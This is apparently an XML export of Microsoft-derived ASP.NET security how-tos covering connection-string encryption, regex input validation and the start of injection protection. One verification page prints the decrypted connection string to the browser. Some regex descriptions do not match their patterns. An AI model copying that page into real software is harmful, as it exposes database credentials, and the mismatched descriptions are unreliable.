&lt;p&gt;If the command runs successfully, you will see the following output. &lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;Adding ACL for access to the RSA Key container...Succeeded!  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;You can check the ACL of the file in the following folder: &lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;\Documents and Settings\All Users\Application Data\Microsoft\Crypto\RSA\MachineKeys  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Your RSA key container file will be the one in this folder with the most recent timestamp.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;Add the following Default.aspx Web page to your application's virtual directory, and then browse to this page to verify that encryption and decryption work correctly.
&lt;div&gt;
&lt;pre&gt;&amp;lt;%@ Page Language=&amp;quot;C#&amp;quot; %&amp;gt;&lt;br&gt;&amp;lt;script runat=&amp;quot;server&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; protected void Page_Load(object sender, EventArgs e)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Response.Write(&amp;quot;Clear text connection string is: &amp;quot; &amp;#43; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;       ConfigurationManager.ConnectionStrings[&amp;quot;MyLocalSQLServer&amp;quot;].ConnectionString);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;lt;/script&amp;gt;&lt;br&gt;&amp;lt;html&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;body/&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;MyLocalSQLServer is the name of the connection string you specified previously in the Web.config file.
&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>6513cc58-bf67-4458-a4fa-cee65144db25</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>How to Use Regular Expressions to Constrain Input in ASP.NET</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Input and Data Validation</category>
    <phase>Implementation</phase>
    <rule_Type>How To</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Summary&lt;/h1&gt;
&lt;p&gt;This How to shows how you can use regular expressions within ASP.NET applications to constrain untrusted input. Regular expressions are a good way to validate text fields such as names, addresses, phone numbers, and other user information. You can use them
 to constrain input, apply formatting rules, and check lengths. To validate input captured with server controls, you can use the
&lt;strong&gt;RegularExpressionValidator&lt;/strong&gt; control. To validate other forms of input, such as query strings, cookies, and HTML control input, you can use the
&lt;strong&gt;System.Text.RegularExpressions.Regex&lt;/strong&gt; class.&lt;/p&gt;
&lt;p&gt;This How to shows how you can use regular expressions within ASP.NET applications to constrain untrusted input.&lt;/p&gt;
&lt;h1&gt;Contents&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Objectives&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Overview&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Using a RegularExpressionValidator Control&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Using the Regex Class&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Common Regular Expressions&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Additional Resources&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Objectives&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Use regular expressions to constrain input, apply format rules, and check lengths.
&lt;/li&gt;&lt;li&gt;Use the ASP.NET &lt;strong&gt;RegularExpressionValidator&lt;/strong&gt; control to constrain and validate input.
&lt;/li&gt;&lt;li&gt;Use the &lt;strong&gt;Regex&lt;/strong&gt; class to constrain and validate input. &lt;/li&gt;&lt;li&gt;Learn common regular expressions that can be used to constrain input. &lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Overview&lt;/h1&gt;
&lt;p&gt;If you make unfounded assumptions about the type, length, format, or range of input, your application is unlikely to be robust. Input validation can become a security issue if an attacker discovers that you have made unfounded assumptions. The attacker can
 then supply carefully crafted input that compromises your application by attempting SQL injection, cross-site scripting, and other injection attacks. To avoid such vulnerability, you should validate text fields (such as names, addresses, tax identification
 numbers, and so on) and use regular expressions to do the following: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Constrain the acceptable range of input characters. &lt;/li&gt;&lt;li&gt;Apply formatting rules. For example, pattern-based fields, such as tax identification numbers, ZIP Codes, or postal codes, require specific patterns of input characters.
&lt;/li&gt;&lt;li&gt;Check lengths. &lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;Regular expression support is available to ASP.NET applications through the &lt;strong&gt;
RegularExpressionValidator&lt;/strong&gt; control and the &lt;strong&gt;Regex&lt;/strong&gt; class in the
&lt;strong&gt;System.Text.RegularExpressions&lt;/strong&gt; namespace.&lt;/p&gt;
&lt;h1&gt;Using a RegularExpressionValidator Control&lt;/h1&gt;
&lt;p&gt;If you capture input by using server controls, you can use the &lt;strong&gt;RegularExpressionValidator&lt;/strong&gt; control to validate that input. You can use regular expressions to restrict the range of valid characters, to strip unwanted characters, and to perform
 length and format checks. You can constrain the input format by defining patterns that the input must match.&lt;/p&gt;
&lt;h2&gt;To validate a server control's input using a RegularExpressionValidator &lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Add a &lt;strong&gt;RegularExpressionValidator&lt;/strong&gt; control to your page. &lt;/li&gt;&lt;li&gt;Set the &lt;strong&gt;ControlToValidate&lt;/strong&gt; property to indicate which control to validate.
&lt;/li&gt;&lt;li&gt;Set the &lt;strong&gt;ValidationExpression&lt;/strong&gt; property to an appropriate regular expression.
&lt;/li&gt;&lt;li&gt;Set the &lt;strong&gt;ErrorMessage&lt;/strong&gt; property to define the message to display if the validation fails.
&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;The following example shows a &lt;strong&gt;RegularExpressionValidator&lt;/strong&gt; control used to validate a name field.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;%@ language=&amp;quot;C#&amp;quot; %&amp;gt;&lt;br&gt;&amp;lt;form id=&amp;quot;form1&amp;quot; runat=&amp;quot;server&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:TextBox ID=&amp;quot;txtName&amp;quot; runat=&amp;quot;server&amp;quot;/&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:Button ID=&amp;quot;btnSubmit&amp;quot; runat=&amp;quot;server&amp;quot; Text=&amp;quot;Submit&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:RegularExpressionValidator ID=&amp;quot;regexpName&amp;quot; runat=&amp;quot;server&amp;quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ErrorMessage=&amp;quot;This expression does not validate.&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ControlToValidate=&amp;quot;txtName&amp;quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ValidationExpression=&amp;quot;^[a-zA-Z'.\s]{1,40}$&amp;quot; /&amp;gt;&lt;br&gt;&amp;lt;/form&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The regular expression used in the preceding code example constrains an input name field to alphabetic characters (lowercase and uppercase), space characters, the single quotation mark (or apostrophe) for names such as O'Dell, and the period or dot character.
 In addition, the field length is constrained to 40 characters.&lt;/p&gt;
&lt;h2&gt;Using ^ and $&lt;/h2&gt;
&lt;p&gt;Enclosing the expression in the caret (&lt;strong&gt;^&lt;/strong&gt;) and dollar sign (&lt;strong&gt;$)&lt;/strong&gt;markers ensures that the expression consists of the desired content and nothing else. A
&lt;strong&gt;^&lt;/strong&gt; matches the position at the beginning of the input string and a
&lt;strong&gt;$&lt;/strong&gt; matches the position at the end of the input string. If you omit these markers, an attacker could affix malicious input to the beginning or end of valid content and bypass your filter.&lt;/p&gt;
&lt;h1&gt;Using the Regex Class&lt;/h1&gt;
&lt;p&gt;If you are not using server controls (which means you cannot use the validation controls) or if you need to validate input from sources other than form fields, such as query string parameters or cookies, you can use the
&lt;strong&gt;Regex&lt;/strong&gt; class within the &lt;strong&gt;System.Text.RegularExpressions&lt;/strong&gt; namespace.&lt;/p&gt;
&lt;h2&gt;To use the Regex class &lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Add a &lt;strong&gt;using&lt;/strong&gt; statement to reference the &lt;strong&gt;System.Text.RegularExpressions&lt;/strong&gt; namespace.
&lt;/li&gt;&lt;li&gt;Call the &lt;strong&gt;IsMatch&lt;/strong&gt; method of the &lt;strong&gt;Regex&lt;/strong&gt; class, as shown in the following example.
&lt;div&gt;
&lt;pre&gt;// Instance method:&lt;br&gt;Regex reg = new Regex(@&amp;quot;^[a-zA-Z'.]{1,40}$&amp;quot;);&lt;br&gt;Response.Write(reg.IsMatch(txtName.Text));&lt;br&gt;// Static method:&lt;br&gt;if (!Regex.IsMatch(txtName.Text, &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; @&amp;quot;^[a-zA-Z'.]{1,40}$&amp;quot;))&lt;br&gt;{&lt;br&gt;&amp;nbsp; // Name does not match schema&lt;br&gt;}  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;For performance reasons, you should use the static &lt;strong&gt;IsMatch&lt;/strong&gt; method where possible to avoid unnecessary object creation.&lt;/p&gt;
&lt;p&gt;The following example shows how to use a regular expression to validate a name input through a regular client-side HTML control.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;%@ Page Language=&amp;quot;C#&amp;quot; %&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;html&amp;nbsp; &amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;body&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;form id=&amp;quot;form1&amp;quot; method=&amp;quot;post&amp;quot; action=&amp;quot;HtmlControls.aspx&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Name:&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;input name=&amp;quot;txtName&amp;quot; type=&amp;quot;text&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;input name=&amp;quot;submitBtn&amp;quot; type=&amp;quot;Submit&amp;quot; value=&amp;quot;Submit&amp;quot;/&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/form&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;pre&gt;&amp;lt;script runat=&amp;quot;server&amp;quot;&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp; void Page_Load(object sender, EventArgs e)&lt;br&gt;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; if (Request.RequestType == &amp;quot;POST&amp;quot;)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; string name = Request.Form[&amp;quot;txtName&amp;quot;];&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if (name.Length &amp;gt; 0)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if (System.Text.RegularExpressions.Regex.IsMatch(name, &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;quot;^[a-zA-Z'.]{1,40}$&amp;quot;))&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Response.Write(&amp;quot;Valid name&amp;quot;);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; else&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Response.Write(&amp;quot;Invalid name&amp;quot;);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp; }&lt;/pre&gt;
&lt;pre&gt;&amp;lt;/script&amp;gt;  &lt;/pre&gt;
&lt;h2&gt;Use Regular Expression Comments&lt;/h2&gt;
&lt;p&gt;Regular expressions are much easier to understand if you use the following syntax and comment each component of the expression by using a number sign (&lt;strong&gt;#&lt;/strong&gt;). To enable comments, you must also specify
&lt;strong&gt;RegexOptions.IgnorePatternWhitespace&lt;/strong&gt;, which means that non-escaped white space is ignored.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;Regex regex = new Regex(@&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ^&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; # anchor at the start&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (?=.*\d)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; # must contain at least one numeric character&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (?=.*[a-z])&amp;nbsp; # must contain one lowercase character&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (?=.*[A-Z])&amp;nbsp; # must contain one uppercase character&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; .{8,10}&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; # From 8 to 10 characters in length&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; \s&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; # allows a space &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; # anchor at the end&amp;quot;, &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; RegexOptions.IgnorePatternWhitespace);  &lt;/pre&gt;
&lt;/div&gt;
&lt;h1&gt;Common Regular Expressions&lt;/h1&gt;
&lt;p&gt;Some common regular expressions are shown in Table 1.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Table 1. Common Regular Expressions&lt;/strong&gt;&lt;/p&gt;
&lt;div&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;th&gt;Field &lt;/th&gt;
&lt;th&gt;Expression&lt;/th&gt;
&lt;th&gt;Format Samples&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Name&lt;/td&gt;
&lt;td&gt;^[a-zA-Z''-'\s]{1,40}$&lt;/td&gt;
&lt;td&gt;John Doe&lt;br&gt;
O'Dell&lt;/td&gt;
&lt;td&gt;Validates a name. Allows up to 40 uppercase and lowercase characters and a few special characters that are common to some names. You can modify this list.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Social Security Number&lt;/td&gt;
&lt;td&gt;^\d{3}-\d{2}-\d{4}$&lt;/td&gt;
&lt;td&gt;111-11-1111&lt;/td&gt;
&lt;td&gt;Validates the format, type, and length of the supplied input field. The input must consist of 3 numeric characters followed by a dash, then 2 numeric characters followed by a dash, and then 4 numeric characters.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Phone Number&lt;/td&gt;
&lt;td&gt;^[01]?[- .]?(\([2-9]\d{2}\)|[2-9]\d{2})[- .]?\d{3}[- .]?\d{4}$&lt;/td&gt;
&lt;td&gt;(425) 555-0123&lt;br&gt;
425-555-0123&lt;br&gt;
425 555 0123&lt;br&gt;
1-425-555-0123&lt;/td&gt;
&lt;td&gt;Validates a U.S. phone number. It must consist of 3 numeric characters, optionally enclosed in parentheses, followed by a set of 3 numeric characters and then a set of 4 numeric characters.
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;E-mail &lt;/td&gt;
&lt;td&gt;^([0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*@([0-9a-zA-Z][-\w]*[0-9a-zA-Z]\.)&amp;#43;[a-zA-Z]{2,9})$&lt;/td&gt;
&lt;td&gt;someone@example.com&lt;/td&gt;
&lt;td&gt;Validates an e-mail address.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;URL&lt;/td&gt;
&lt;td&gt;^(ht|f)tp(s?)\:\/\/[0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*(:(0-9)*)*(\/?)([a-zA-Z0-9\-\.\?\,\'\/\\\&amp;#43;&amp;amp;amp;%\$#_]*)?$&lt;/td&gt;
&lt;td&gt;http://www.microsoft.com&lt;/td&gt;
&lt;td&gt;Validates a URL &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ZIP Code&lt;/td&gt;
&lt;td&gt;^(\d{5}-\d{4}|\d{5}|\d{9})$|^([a-zA-Z]\d[a-zA-Z] \d[a-zA-Z]\d)$&lt;/td&gt;
&lt;td&gt;12345&lt;/td&gt;
&lt;td&gt;Validates a U.S. ZIP Code. The code must consist of 5 or 9 numeric characters.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Password&lt;/td&gt;
&lt;td&gt;(?!^[0-9]*$)(?!^[a-zA-Z]*$)^([a-zA-Z0-9]{8,10})$&lt;/td&gt;
&lt;td&gt;&amp;nbsp;&lt;/td&gt;
&lt;td&gt;Validates a strong password. It must be between 8 and 10 characters, contain at least one digit and one alphabetic character, and must not contain special characters.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Non- negative integer&lt;/td&gt;
&lt;td&gt;^\d&amp;#43;$&lt;/td&gt;
&lt;td&gt;0&lt;br&gt;
986&lt;/td&gt;
&lt;td&gt;Validates that the field contains an integer greater than zero.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Currency (non- negative)&lt;/td&gt;
&lt;td&gt;^\d&amp;#43;(\.\d\d)?$&lt;/td&gt;
&lt;td&gt;1.00&lt;/td&gt;
&lt;td&gt;Validates a positive currency amount. If there is a decimal point, it requires 2 numeric characters after the decimal point. For example, 3.00 is valid but 3.1 is not.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Currency (positive or negative)&lt;/td&gt;
&lt;td&gt;^(-)?\d&amp;#43;(\.\d\d)?$&lt;/td&gt;
&lt;td&gt;1.20&lt;/td&gt;
&lt;td&gt;Validates for a positive or negative currency amount. If there is a decimal point, it requires 2 numeric characters after the decimal point.&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information, see the regular expression tutorial at &lt;a href="http://www.regular-expressions.info/tutorial.html"&gt;
http://www.regular-expressions.info/tutorial.html&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>6bfe7761-6f2a-43c2-a104-7ad3063affb3</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>How to Protect From Injection Attacks in ASP.NET</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Input and Data Validation</category>
    <phase>Implementation</phase>
    <rule_Type>How To</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Summary&lt;/h1&gt;
&lt;p&gt;This How to shows how you can validate input to protect your application from injection attacks. Performing input validation is essential because almost all application-level attacks contain malicious input.
&lt;/p&gt;
&lt;p&gt;You should validate all input, including form fields, query string parameters, and cookies to protect your application against malicious command injection. Assume all input to your Web application is malicious, and make sure that you use server validation
 for all sources of input. Use client-side validation to reduce round trips to the server and to improve the user experience, but do not rely on it because it is easily bypassed.
&lt;/p&gt;
&lt;p&gt;To validate input, define acceptable input for each application input field. A proven practice is to constrain input for length, range, format, and type. Use the list of acceptable characters to define valid input, instead of the list of unacceptable characters.
 Using the list of unacceptable characters is impractical because it is very difficult to anticipate all possible variations of bad input.&lt;/p&gt;
&lt;p&gt;When you need to accept a range of HTML characters, make sure that you HTML-encode the data to make it safe prior to displaying it as output.&lt;/p&gt;
&lt;h1&gt;Contents&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Objectives&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Overview&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Summary of Steps&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Step 1. Use ASP.NET Request Validation&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Step 2. Constrain Input&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Step 3. Encode Unsafe Output&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Step 4. Use Command Parameters for SQL Queries&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Step 5. Verify that ASP.NET Errors Are Not Returned to the Client&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;Additional Resources&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Objectives&lt;/h1&gt;
&lt;ul&gt;
